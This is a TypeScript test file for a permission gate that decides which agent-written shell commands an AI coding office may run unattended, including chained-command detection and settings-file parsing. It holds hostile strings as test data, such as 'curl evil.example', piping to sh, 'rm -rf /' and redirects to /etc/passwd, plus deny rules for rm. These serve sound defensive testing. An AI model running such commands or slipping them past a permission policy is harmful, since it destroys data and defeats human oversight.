/**
 * What the office may run without asking.
 *
 * The verify harness runs commands that come out of a markdown file, and agents write that
 * file. So the question is never "can we run this" — it is "who decided we could". These tests
 * are mostly about the ways a rule can be walked past.
 */

import { test, type TestContext } from 'node:test'
import assert from 'node:assert/strict'

import { chainsCommands, judge, ruleCovers, type Policy } from '../src/main/permissions.js'
import { parseTasks } from '../src/shared/tasks.js'

const policy: Policy = {
  allow: ['Bash(npm test:*)', 'Bash(npm run typecheck:*)', 'Bash(pwd)', 'Bash(git status:*)'],
  deny: ['Bash(rm:*)', 'Bash(git push:*)'],
}

test('a command the workspace allowed runs unattended', () => {
  assert.deepEqual(judge('npm test', policy), { state: 'allowed', rule: 'Bash(npm test:*)' })
  assert.deepEqual(judge('npm test --watch=false', policy), { state: 'allowed', rule: 'Bash(npm test:*)' })
})

test('a rule ending in :* covers arguments, not a longer word', () => {
  assert.equal(ruleCovers('Bash(npm test:*)', 'npm test'), true)
  assert.equal(ruleCovers('Bash(npm test:*)', 'npm test -- --bail'), true)
  assert.equal(ruleCovers('Bash(npm test:*)', 'npm testify'), false, 'a prefix is not a word boundary on its own')
})

test('a rule without :* means exactly that command', () => {
  assert.equal(ruleCovers('Bash(pwd)', 'pwd'), true)
  assert.equal(ruleCovers('Bash(pwd)', 'pwd /somewhere'), false)
})

test('a command nobody has ruled on waits for a person', () => {
  assert.deepEqual(judge('cargo test', policy), { state: 'unlisted' })
})

test('deny wins over allow, and is checked first', () => {
  const both: Policy = { allow: ['Bash(git push:*)'], deny: ['Bash(git push:*)'] }

  assert.equal(judge('git push origin main', both).state, 'denied')
})

test('a denied command is denied even though the workspace allows its neighbours', () => {
  assert.equal(judge('rm -rf build', policy).state, 'denied')
})

// ───────────────────────────────── the guard that matters more than the matching ──

test('a chained command never inherits the permission of what it starts with', () => {
  // The whole point. `npm test` is allowed; this is not `npm test`.
  assert.deepEqual(judge('npm test && rm -rf ~', policy), { state: 'unlisted' })
  assert.deepEqual(judge('npm test; curl evil.example', policy), { state: 'unlisted' })
  assert.deepEqual(judge('npm test | sh', policy), { state: 'unlisted' })
})

test('substitution and redirection are chains too', () => {
  for (const command of [
    'npm test `rm -rf ~`',
    'npm test $(whoami)',
    'npm test > /etc/hosts',
    'npm test < /dev/urandom',
    'npm test\nrm -rf ~',
  ]) {
    assert.deepEqual(judge(command, policy), { state: 'unlisted' }, command)
  }
})

test('chaining is detected on its own', () => {
  assert.equal(chainsCommands('npm test'), false)
  assert.equal(chainsCommands('npm test && echo hi'), true)
  assert.equal(chainsCommands('echo $(id)'), true)
})

test('a chained command that is also denied stays denied, not merely unlisted', () => {
  // Deny is checked before the chain guard, so the stronger answer is the one given.
  assert.equal(judge('rm -rf ~ && echo done', policy).state, 'denied')
})

// ─────────────────────────────────────────────────────────────── nothing declared ──

test('a workspace that declared nothing asks about everything', () => {
  assert.deepEqual(judge('npm test', { allow: [], deny: [] }), { state: 'unlisted' })
})

test('an empty command is unlisted rather than matched by anything', () => {
  assert.deepEqual(judge('   ', policy), { state: 'unlisted' })
})

test('a rule about something other than Bash covers no command', () => {
  assert.equal(ruleCovers('Read(**)', 'npm test'), false)
  assert.equal(ruleCovers('WebFetch(domain:example.com)', 'npm test'), false)
})

test('somebody who writes Bash(*) has said what they meant', () => {
  assert.equal(judge('anything at all', { allow: ['Bash(*)'], deny: [] }).state, 'allowed')
  // …and deny still beats it.
  assert.equal(judge('rm -rf ~', { allow: ['Bash(*)'], deny: ['Bash(rm:*)'] }).state, 'denied')
})

// ──────────────────────────────── reading the policy, and saying what was skipped ──

import { mkdir as makeDir, writeFile as write } from 'node:fs/promises'
import { join as path } from 'node:path'
import { policyProblem, readPolicy } from '../src/main/permissions.js'
import { tempDir } from './temp-dir.js'

async function workspace(t: TestContext, files: Record<string, string>): Promise<string> {
  const root = await tempDir(t, 'office-policy-')
  await makeDir(path(root, '.claude'), { recursive: true })
  for (const [name, body] of Object.entries(files)) await write(path(root, '.claude', name), body)
  return root
}

const rules = (allow: string[], deny: string[] = []) =>
  JSON.stringify({ permissions: { allow, deny } })

test('a workspace with no settings has declared nothing, and that is not a failure', async (t) => {
  const read = await readPolicy(await workspace(t, {}))
  assert.deepEqual(read.policy, { allow: [], deny: [], denyFrom: [] })
  assert.equal(read.incomplete, false)
  // Missing is missing. Both files are reported as consulted, because "no rules" means nothing
  // to somebody who does not know where we looked.
  assert.deepEqual(read.sources.map((s) => s.state), ['missing', 'missing'])
  assert.equal(policyProblem(read), null)
})

test('settings.local.json is read too, and its rules are in force', async (t) => {
  // The fault this closes: reading only the shared file reports fewer rules than actually
  // apply, so the office says a command is unlisted when the user has allowed it.
  const root = await workspace(t, {
    'settings.json': rules(['Bash(npm test:*)']),
    'settings.local.json': rules(['Bash(cargo test:*)'], ['Bash(rm:*)']),
  })
  const read = await readPolicy(root)

  assert.deepEqual(read.policy.allow, ['Bash(npm test:*)', 'Bash(cargo test:*)'])
  assert.deepEqual(read.policy.deny, ['Bash(rm:*)'])
  assert.equal(judge('cargo test --all', read.policy).state, 'allowed')
})

test('a malformed settings file is unreadable, NOT empty', async (t) => {
  // The whole point. The old version caught everything and returned an empty policy, so a
  // trailing comma was indistinguishable from a workspace that had declared nothing — and the
  // CLI does the same one layer down, silently ignoring a settings file that fails validation
  // under --print. Neither layer would have told anybody.
  const root = await workspace(t, { 'settings.json': '{ "permissions": { "allow": ["Bash(ls:*)"], } }' })
  const read = await readPolicy(root)

  assert.equal(read.incomplete, true)
  assert.equal(read.sources[0]?.state, 'unreadable')
  assert.notEqual(read.sources[0]?.state, 'missing')

  const problem = policyProblem(read)
  assert.match(problem ?? '', /could not be read/)
  // Says the thing that actually matters: it looks identical to having no rules.
  assert.match(problem ?? '', /looks exactly like having none/)
})

test('one broken file does not discard the other one', async (t) => {
  const root = await workspace(t, {
    'settings.json': rules(['Bash(npm test:*)']),
    'settings.local.json': 'not json at all',
  })
  const read = await readPolicy(root)

  assert.deepEqual(read.policy.allow, ['Bash(npm test:*)'], 'a broken local file ate the shared one')
  assert.equal(read.incomplete, true)
  assert.deepEqual(read.sources.map((s) => s.state), ['ok', 'unreadable'])
})

test('each source reports how much it contributed', async (t) => {
  const root = await workspace(t, { 'settings.json': rules(['Bash(ls:*)', 'Bash(cat:*)'], ['Bash(rm:*)']) })
  const read = await readPolicy(root)
  assert.deepEqual(read.sources[0], { file: 'settings.json', state: 'ok', allow: 2, deny: 1 })
})

/*
 * A file that parses and is not a settings object.
 *
 * Measured on dev at `cc63256`: a `settings.json` holding `null` made `readPolicy` reject with
 * "Cannot read properties of null (reading 'permissions')". `JSON.parse` accepts `null`, and the
 * rules were then read off it. Callers treat this read as one that never rejects: `session.ts`
 * says so outright of its own call, and `checkPolicy` in `main.ts` awaits it before the window is
 * created. Measured the same day, an office started on such a workspace reached `ready` and made
 * no window in the 12 seconds it was watched, with the rejection on stderr.
 *
 * The other shapes did not throw. They read as `ok` with no rules, which is a workspace that had
 * declared nothing. That is the confusion `unreadable` exists to prevent: the file is there, and
 * none of it can be trusted as rules.
 */
test('a settings file holding null is unreadable, and reading it does not throw', async (t) => {
  const root = await workspace(t, { 'settings.json': 'null' })
  const read = await readPolicy(root).catch((err: unknown) =>
    assert.fail(`reading the policy rejected: ${String(err)}`),
  )

  assert.equal(read.incomplete, true, 'a file that could not be used left the policy looking whole')
  assert.equal(read.sources[0]?.state, 'unreadable')
  assert.deepEqual(read.policy, { allow: [], deny: [], denyFrom: [] })
})

test('a settings file whose top level is not an object declares no trusted rules', async (t) => {
  // Each shape is named as what it is. The sentence was asserted only for `null`, and in review
  // an array called "null" and a string called "a number" both passed.
  const wrapped = '[{ "permissions": { "deny": ["Bash(rm:*)"] } }]'
  const shapes = [
    ['true', 'true'],
    ['5', 'a number'],
    ['"Bash(rm:*)"', 'a string'],
    ['[]', 'an array'],
    [wrapped, 'an array'],
  ] as const
  for (const [body, shape] of shapes) {
    const read = await readPolicy(await workspace(t, { 'settings.json': body }))
    assert.equal(read.sources[0]?.state, 'unreadable', `${body} was read as a settings object`)
    assert.equal(read.incomplete, true, `${body} left the policy looking whole`)
    assert.equal(read.sources[0]?.cause, `Its top level is ${shape}, not an object.`)
  }
})

test('a settings file that is not an object does not stop the other one being read', async (t) => {
  // Each file is read on its own, as a parse error already is above. In review, a `break` in place
  // of the `continue` for this case passed every test, and settings.local.json's rules went unread.
  const root = await workspace(t, {
    'settings.json': 'null',
    'settings.local.json': rules(['Bash(cargo test:*)'], ['Bash(rm:*)']),
  })
  const read = await readPolicy(root)

  assert.deepEqual(read.sources.map((s) => s.state), ['unreadable', 'ok'])
  assert.deepEqual(read.policy, {
    allow: ['Bash(cargo test:*)'],
    deny: ['Bash(rm:*)'],
    denyFrom: ['settings.local.json'],
  })
  assert.equal(read.incomplete, true)
})

test('an object with no rules in it is still a settings file', async (t) => {
  // The other side of the line, so it is not drawn too far: an object is settings, whatever it
  // does or does not declare.
  for (const body of ['{}', '{ "env": { "CI": "1" } }', '{ "permissions": {} }']) {
    const read = await readPolicy(await workspace(t, { 'settings.json': body }))
    assert.equal(read.sources[0]?.state, 'ok', `${body} was not read as settings`)
    assert.equal(read.incomplete, false)
  }
})

test('the sentence for it says what the file holds, and nothing that is not so', async (t) => {
  const read = await readPolicy(await workspace(t, { 'settings.json': 'null' })).catch(
    (err: unknown) => assert.fail(`reading the policy rejected: ${String(err)}`),
  )
  const problem = policyProblem(read) ?? ''

  assert.match(problem, /\.claude\/settings\.json/)
  assert.match(problem, /not in force/)
  assert.match(problem, /looks exactly like having none/)
  assert.match(problem, /null, not an object/, `the sentence reads ${JSON.stringify(problem)}`)
  // The file was read. A bare "could not be read" would be false of it.
  assert.doesNotMatch(problem, /could not be read[,.]/)
})

// ───────────────────────── rules in a shape Claude Code does not read, and saying so ──

import { triageAgainst, type ApprovalRequest } from '../src/main/approvals.js'
import { shippedAllowRules } from '../src/main/permissions.js'

const UNTIL =
  'Until that is fixed, the office refuses what the rules it could read refuse, and puts every ' +
  'other call it holds to a person.'

/*
 * Rules in the wrong shape.
 *
 * Found by reading, on dev at `cc63256`: `asRules` gave `[]` for anything that was not an array,
 * and dropped entries that were not strings, without a word. So a deny list written as a string
 * read as `ok` with no deny rules and `incomplete` false, and in bypass mode `triage` allowed the
 * `rm` that list was written to stop.
 *
 * What Claude Code 2.1.266 does with the same files, measured on 2026-09-16 with `claude doctor`
 * and with `claude -p` in a scratch project:
 * - A rule list that is not an array, or `permissions` that is not an object, fails validation,
 *   and the whole file is skipped. A valid deny rule was not in force beside a string `allow`, a
 *   string `ask`, a `null` `allow`, or a string `env`.
 * - An entry that is not a string is removed, and the rest of the file stays in force.
 */

const held = (command: string): ApprovalRequest => ({
  sessionId: 's-1',
  toolUseId: 't-1',
  tool: 'Bash',
  input: { command },
  cwd: '/w',
  askedAt: '2026-09-16T10:00:00.000Z',
  waitMs: 240_000,
  agent: null,
  agentId: null,
})

test('a deny list written as a string is unreadable, so triage asks rather than allowing what it names', async (t) => {
  // Triage, not bypass mode as a whole. Claude Code sets this whole file aside, and a gate
  // registered in the same file would not load either (inferred, found in review), so this
  // holds where the gate is registered somewhere Claude Code still reads.
  const body = '{ "permissions": { "deny": "Bash(rm:*)" } }'
  const read = await readPolicy(await workspace(t, { 'settings.json': body }))

  assert.equal(read.sources[0]?.state, 'unreadable', 'a deny rule nothing applies read as settings')
  assert.equal(read.incomplete, true, 'the policy looked whole with its deny rule missing')
  assert.equal(read.sources[0]?.cause, 'Its "permissions.deny" is a string, not a list of rules.')
  assert.deepEqual(triageAgainst(held('rm -rf dist'), read, 'bypassPermissions'), { action: 'ask' })
})

test('a rule list in any other shape is unreadable too, and each shape is named', async (t) => {
  const shapes = [
    ['"Bash(rm:*)"', 'a string'],
    ['null', 'null'],
    ['{ "Bash": "rm" }', 'an object'],
    ['42', 'a number'],
    ['true', 'true'],
  ] as const
  // `ask` is not a list the office uses. Its shape still decides whether Claude Code keeps the
  // file, and so whether the office may keep using the file's other rules.
  for (const list of ['allow', 'deny', 'ask'] as const) {
    for (const [value, shape] of shapes) {
      const body = `{ "permissions": { "${list}": ${value} } }`
      const read = await readPolicy(await workspace(t, { 'settings.json': body }))
      assert.equal(read.sources[0]?.state, 'unreadable', `${body} was read as settings`)
      assert.equal(read.incomplete, true, `${body} left the policy looking whole`)
      const cause = `Its "permissions.${list}" is ${shape}, not a list of rules.`
      assert.equal(read.sources[0]?.cause, cause)
    }
  }
})

test('a file with one list in the wrong shape contributes none of its rules', async (t) => {
  // Claude Code skipped the whole file (measured), valid lists included. Keeping the allow here
  // would let the gate answer yes from rules Claude Code has set aside.
  const permissions = { allow: ['Bash(npm test:*)'], deny: ['Bash(git push:*)'], ask: 'Bash(ls)' }
  const root = await workspace(t, { 'settings.json': JSON.stringify({ permissions }) })
  const read = await readPolicy(root)

  assert.deepEqual(read.policy, { allow: [], deny: [], denyFrom: [] })
  assert.deepEqual(read.sources[0], {
    file: 'settings.json',
    state: 'unreadable',
    cause: 'Its "permissions.ask" is a string, not a list of rules.',
    allow: 0,
    deny: 0,
  })
})

test('permissions that are not an object make the file unreadable, and each shape is named', async (t) => {
  const shapes = [
    ['null', 'null'],
    ['"Bash(rm:*)"', 'a string'],
    ['["Bash(rm:*)"]', 'an array'],
    ['7', 'a number'],
    ['false', 'false'],
  ] as const
  for (const [value, shape] of shapes) {
    const body = `{ "permissions": ${value} }`
    const read = await readPolicy(await workspace(t, { 'settings.json': body }))
    assert.equal(read.sources[0]?.state, 'unreadable', `${body} was read as settings`)
    assert.equal(read.incomplete, true, `${body} left the policy looking whole`)
    assert.equal(read.sources[0]?.cause, `Its "permissions" is ${shape}, not an object.`)
  }
})

test('a list in the wrong shape does not stop the other file being read', async (t) => {
  const root = await workspace(t, {
    'settings.json': '{ "permissions": { "deny": "Bash(rm:*)" } }',
    'settings.local.json': rules(['Bash(cargo test:*)'], ['Bash(git push:*)']),
  })
  const read = await readPolicy(root)

  assert.deepEqual(read.sources.map((s) => s.state), ['unreadable', 'ok'])
  assert.deepEqual(read.policy, { allow: ['Bash(cargo test:*)'], deny: ['Bash(git push:*)'], denyFrom: ['settings.local.json'] })
  assert.equal(read.incomplete, true)

  // A deny rule that was read still refuses. `triage` promises a denied call is never offered to
  // a person, and in review this state turned that refusal into a question.
  const refused = { action: 'deny', rule: 'Bash(git push:*)' }
  assert.deepEqual(triageAgainst(held('git push origin main'), read, 'bypassPermissions'), refused)
  assert.deepEqual(triageAgainst(held('git push origin main'), read), refused)
  assert.deepEqual(triageAgainst(held('cargo test'), read, 'bypassPermissions'), { action: 'ask' })
})

test('an allow entry that is not a rule is skipped and counted, and the rest of the file stays', async (t) => {
  const body = '{ "permissions": { "allow": ["Bash(npm test:*)", 42, { "tool": "Bash" }] } }'
  const read = await readPolicy(await workspace(t, { 'settings.json': body }))

  assert.deepEqual(read.sources[0], {
    file: 'settings.json',
    state: 'ok',
    allow: 1,
    deny: 0,
    skipped: [
      { list: 'allow', shape: 'a number' },
      { list: 'allow', shape: 'an object' },
    ],
  })
  assert.deepEqual(read.policy.allow, ['Bash(npm test:*)'])
  // A missing allow can only leave the office less willing than what was written, in any mode.
  assert.equal(read.incomplete, false)
})

test('a deny entry that is not a rule leaves the deny list short: what it holds still refuses, the rest is asked', async (t) => {
  const permissions = { allow: ['Bash(npm test:*)'], deny: ['Bash(git push:*)', { Bash: 'rm' }] }
  const root = await workspace(t, { 'settings.json': JSON.stringify({ permissions }) })
  const read = await readPolicy(root)

  // Claude Code keeps this file, so its rules are the ones in force.
  assert.equal(read.sources[0]?.state, 'ok')
  assert.deepEqual(read.policy, { allow: ['Bash(npm test:*)'], deny: ['Bash(git push:*)'], denyFrom: ['settings.json'] })
  assert.deepEqual(read.sources[0]?.skipped, [{ list: 'deny', shape: 'an object' }])
  assert.equal(read.incomplete, true, 'a deny list shorter than the one written looked whole')
  assert.deepEqual(triageAgainst(held('rm -rf dist'), read, 'bypassPermissions'), { action: 'ask' })
  // What the list does hold still refuses, in every mode.
  const refused = { action: 'deny', rule: 'Bash(git push:*)' }
  for (const mode of ['default', 'plan', 'acceptEdits', 'dontAsk', 'bypassPermissions'] as const) {
    const call = triageAgainst(held('git push origin'), read, mode)
    assert.deepEqual(call, refused, `asked under ${mode}`)
  }
  // And what it allows is not allowed while the list is short.
  assert.deepEqual(triageAgainst(held('npm test'), read, 'bypassPermissions'), { action: 'ask' })
})

test('empty lists, and permission keys the office does not read, are not problems', async (t) => {
  const bodies = [
    '{ "permissions": { "allow": [], "deny": [], "ask": [] } }',
    '{ "permissions": { "defaultMode": "acceptEdits", "additionalDirectories": ["../shared"] } }',
  ]
  for (const body of bodies) {
    const read = await readPolicy(await workspace(t, { 'settings.json': body }))
    assert.deepEqual(read.sources[0], { file: 'settings.json', state: 'ok', allow: 0, deny: 0 })
    assert.equal(read.incomplete, false, `${body} left the policy looking incomplete`)
    assert.equal(policyProblem(read), null, `${body} was reported`)
  }
})

test('the sentence for a list in the wrong shape says the file is set aside, and why', async (t) => {
  const body = '{ "permissions": { "deny": "Bash(rm:*)" } }'
  const problem = policyProblem(await readPolicy(await workspace(t, { 'settings.json': body }))) ?? ''

  assert.equal(
    problem,
    '.claude/settings.json exists but could not be read as settings, so its permission rules are ' +
      'not in force — this looks exactly like having none. ' +
      'Its "permissions.deny" is a string, not a list of rules.',
  )
})

test('the sentence for skipped entries says the file is read, and what the entries do not do', async (t) => {
  const allowOnly = '{ "permissions": { "allow": ["Bash(npm test:*)", 42, { "tool": "Bash" }] } }'
  const allowed = policyProblem(await readPolicy(await workspace(t, { 'settings.json': allowOnly })))
  assert.equal(
    allowed,
    '.claude/settings.json was read, but 2 entries in its permissions.allow are not rules ' +
      '(a number and an object). Claude Code skips them too, so they allow nothing.',
  )

  const denyOnly = '{ "permissions": { "deny": ["Bash(git push:*)", { "Bash": "rm" }] } }'
  const localRead = await readPolicy(await workspace(t, { 'settings.local.json': denyOnly }))
  // The sentence below says what an incomplete read makes triage do, so it has to be one.
  assert.equal(localRead.incomplete, true)
  const refused = policyProblem(localRead)
  assert.equal(
    refused,
    '.claude/settings.local.json was read, but 1 entry in its permissions.deny is not a rule ' +
      '(an object). Claude Code skips it too, so it refuses nothing. ' +
      UNTIL,
  )

  // The file's other rules are in force, so nothing may say they are not.
  for (const sentence of [allowed, refused]) {
    assert.doesNotMatch(sentence ?? '', /not in force|like having none|could not be read/)
  }
})

test('skipped entries in both lists are each said once, and repeated shapes are not listed twice', async (t) => {
  const body = '{ "permissions": { "allow": [1, 2, 3], "deny": [null, "Bash(rm:*)"] } }'
  const problem = policyProblem(await readPolicy(await workspace(t, { 'settings.json': body })))

  assert.equal(
    problem,
    '.claude/settings.json was read, but 3 entries in its permissions.allow are not rules ' +
      '(each a number). Claude Code skips them too, so they allow nothing. In the same file, ' +
      '1 entry in its permissions.deny is not a rule (null). Claude Code skips it too, so it ' +
      'refuses nothing. ' +
      UNTIL,
  )
})

test('problems in both files are each said, and what the office does about them is said once', async (t) => {
  // In review, a policyProblem that reported only the first file passed every test, and the
  // closing sentence was repeated once per file.
  const root = await workspace(t, {
    'settings.json': '{ "permissions": { "deny": [42, "Bash(rm:*)"] } }',
    'settings.local.json': '{ "permissions": { "deny": ["Bash(git push:*)", {}, null, 7] } }',
  })
  const problem = policyProblem(await readPolicy(root)) ?? ''

  assert.equal(
    problem,
    '.claude/settings.json was read, but 1 entry in its permissions.deny is not a rule ' +
      '(a number). Claude Code skips it too, so it refuses nothing. ' +
      '.claude/settings.local.json was read, but 3 entries in its permissions.deny are not rules ' +
      '(an object, null and a number). Claude Code skips them too, so they refuse nothing. ' +
      UNTIL,
  )
})

test('the allow rules the shipped file adds are counted the way they are read', async (t) => {
  // `main.ts` used to count `permissions.allow` itself, so its number disagreed with the rules in
  // force: two entries that are not rules counted as two, and a file Claude Code sets aside
  // still counted its allow list (found in review). The untrusted warning quotes this number.
  const count = async (files: Record<string, string>) =>
    shippedAllowRules(await readPolicy(await workspace(t, files)))

  assert.equal(await count({ 'settings.json': rules(['Bash(ls:*)', 'Bash(cat:*)']) }), 2)
  assert.equal(await count({ 'settings.json': '{ "permissions": { "allow": [42, {}] } }' }), 0)
  const setAside = JSON.stringify({ permissions: { allow: ['Bash(ls:*)'], deny: 'Bash(rm:*)' } })
  assert.equal(await count({ 'settings.json': setAside }), 0)
  // Shipped means the shared file: the personal one is not something the workspace ships.
  assert.equal(await count({ 'settings.local.json': rules(['Bash(ls:*)']) }), 0)
  assert.equal(await count({}), 0)
})

test('every shape that starts a second command is caught, and the ones that only look like it are not', () => {
  // `verify.ts` spawns with `shell: true`, so this regex is what stands between an allow-listed
  // command and whatever somebody appended to it. Both halves are asserted, because a guard that
  // caught everything would refuse ordinary arguments and a guard that caught nothing would be
  // this test passing for the wrong reason.
  const allow = ['Bash(npm test:*)']

  for (const chained of [
    'npm test; rm -rf /',
    'npm test && rm -rf /',
    'npm test || rm -rf /',
    'npm test | tee /etc/x',
    'npm test & rm -rf /',
    'npm test > /etc/passwd',
    'npm test < /etc/passwd',
    'npm test $(rm -rf /)',
    'npm test `rm -rf /`',
    'npm test <(rm -rf /)',
    'npm test\nrm -rf /',
    'npm test\rrm -rf /',
  ]) {
    assert.equal(chainsCommands(chained), true, JSON.stringify(chained))
    assert.equal(
      judge(chained, { allow, deny: [] }).state,
      'unlisted',
      `${JSON.stringify(chained)} inherited a rule matched on its first two words`,
    )
  }

  // Arguments that contain shell-ish characters and cannot start a command. Each was checked
  // against a real shell rather than reasoned about — `$'\x3b'` is ANSI-C quoting for a
  // semicolon, and substituting it happens *after* the line is split into commands, so it is an
  // argument. Measured: `echo $'\x3brm -rf ./victim'` prints ";rm -rf ./victim" and ./victim
  // survives.
  for (const ordinary of [
    'npm test',
    'npm test -- --watch=false',
    'npm test ${HOME}',
    'npm test $HOME',
    'npm test ~/x',
    'npm test *',
    'npm test {a,b}',
    String.raw`npm test $'\x3bnot-a-separator'`,
  ]) {
    assert.equal(chainsCommands(ordinary), false, JSON.stringify(ordinary))
    assert.equal(judge(ordinary, { allow, deny: [] }).state, 'allowed', JSON.stringify(ordinary))
  }
})

test('THE FUZZ: nothing a TASKS.md can say gets a destructive command past the policy', () => {
  // The two halves of this were tested apart: `tasks.ts` pulls a command out of a markdown cell,
  // and `judge` decides whether the office may run it unattended. This joins them, because the
  // join is the part that matters — a file an agent wrote becomes a command something executes,
  // and every test either side of that seam names one example.
  //
  // The cells include the shapes a real `TASKS.md` grows: a chained command, a bare path, a
  // sentence with no backticks, an unclosed backtick, a pipe inside one, a 5000-character span,
  // and the "PASS — I checked" that the second standing order exists to refuse.
  let seed = 555
  const rnd = (): number => (seed = (seed * 1103515245 + 12345) & 0x7fffffff) / 0x7fffffff
  const pick = <T,>(xs: readonly T[]): T => xs[Math.floor(rnd() * xs.length)]!
  const NL = String.fromCharCode(10)

  const cells = [
    '`npm test` exits 0', '`npm test; rm -rf /` exits 0', 'reviewed by eye', '`site/index.html` exists',
    '', '...', '`', '``', '`  `', '|', '`a|b`', '`node --test x.js`', '`echo $(whoami)`',
    '`npm test` and `rm -rf /`', 'PASS - I checked', `\`${'x'.repeat(5000)}\``,
  ]
  const owners = ['builder', '', 'manager', '|', 'x'.repeat(200)]
  const titles = ['Do the thing', '', '| pipe |', '`code`', 'x'.repeat(500)]
  const heads = ['## In progress', '## Queued', '## Done', '## Nonsense', '']

  const policy: Policy = { allow: ['Bash(npm test:*)', 'Bash(echo:*)'], deny: ['Bash(rm:*)'] }
  const escaped: string[] = []
  let parsed = 0

  for (let n = 0; n < 10_000; n++) {
    const rows = Array.from({ length: 1 + Math.floor(rnd() * 3) }, (_, i) =>
      `| ${i + 1} | ${pick(titles)} | ${pick(owners)} | ${pick(cells)} |`)
    const md = [pick(heads), '', '| # | Task | Owner | VERIFY |', '|---|---|---|---|', ...rows].join(NL)

    for (const task of parseTasks(md).tasks) {
      parsed += 1
      if (!task.command) continue
      if (judge(task.command, policy).state !== 'allowed') continue
      // Allowed means the office may run it with nobody watching. Two things must never be true
      // of such a command: that it starts a second one, or that it is the destructive thing the
      // deny list names.
      if (chainsCommands(task.command)) escaped.push(`chained: ${task.command}`)
      if (/\brm\b|\bwhoami\b/.test(task.command)) escaped.push(`destructive: ${task.command}`)
    }
  }

  assert.deepEqual(escaped.slice(0, 3), [], `${escaped.length} commands were judged runnable that must not be`)
  // And it parsed something. A parser that returned nothing would satisfy the above completely.
  assert.ok(parsed > 5_000, `only ${parsed} tasks came out of 10000 documents — the fuzz parsed almost nothing`)

  // What this does **not** hold, said rather than implied: it guards the policy half of the seam
  // and not the extraction half. Break `commandIn` so it returns the whole cell and this still
  // passes — a mangled command matches no rule, comes back `unlisted`, and never reaches the
  // assertion. Mutation-checked, and it is `tasks.test.ts` that catches that one: the same change
  // fails eleven of its tests. Two halves, two guards, and this is one of them.
})
